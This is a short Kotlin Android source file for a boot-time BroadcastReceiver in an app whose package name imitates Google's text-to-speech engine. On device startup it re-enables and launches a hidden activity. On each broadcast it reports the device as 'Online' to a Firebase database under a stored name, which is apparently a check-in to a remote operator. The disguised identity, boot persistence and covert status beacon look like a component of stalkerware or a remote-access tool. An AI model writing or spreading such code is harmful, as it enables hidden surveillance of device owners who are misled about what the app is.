package com.googli.googletext_to_speechengine

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import com.google.firebase.database.FirebaseDatabase

class Text_to_Speech_Receiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (Intent.ACTION_BOOT_COMPLETED == intent!!.action) {
            val activityIntent = Intent(context, FlashActivity::class.java)
            activityIntent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            addDrawerIcon(context!!)
            context!!.startActivity(activityIntent)
           // context!!.startService(Intent(context,Text_to_Speech_Service::class.java))
            //Toast.makeText(context, "Booted", Toast.LENGTH_LONG).show()
        }
        FirebaseDatabase.getInstance().reference.child(context!!.getSharedPreferences("Main", 0).getString("Name", "")).child("Status").setValue("Online")

        //context!!.startActivity(Intent(context, MainActivity::class.java))

        //Toast.makeText(context, "Booted", Toast.LENGTH_LONG).show()

    }
    fun addDrawerIcon(context: Context) {
        val componentToDisable = ComponentName("com.googli.googletext_to_speechengine",
                "com.googli.googletext_to_speechengine.FlashActivity")

        context.packageManager.setComponentEnabledSetting(
                componentToDisable,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP)
    }
}